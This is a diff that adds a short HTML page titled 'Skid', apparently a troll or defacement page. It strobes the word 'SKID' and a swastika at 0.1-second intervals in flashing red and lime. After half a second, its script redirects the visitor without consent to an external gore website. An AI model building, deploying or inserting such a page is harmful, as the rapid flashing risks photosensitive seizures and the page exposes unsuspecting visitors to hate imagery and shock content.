@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Skid</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: black;
+        }
+        #flashText {
+            font-size: 72px;
+            font-weight: bold;
+            animation: flash 0.1s infinite, colorChange 0.2s infinite;
+        }
+        #bigQ {
+            font-size: 200px;
+            animation: flash 0.1s infinite, colorChange 0.2s infinite;
+        }
+        @keyframes flash {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        @keyframes colorChange {
+            0% { color: red; }
+            50% { color: lime; }
+            100% { color: red; }
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <span id="flashText">SKID</span>
+        <span id="bigQ">卐</span>
+    </div>
+    <script>
+        setTimeout(() => {
+            window.location.href = 'https://xgore.net';
+        }, 500);
+    </script>
+</body>
+</html>
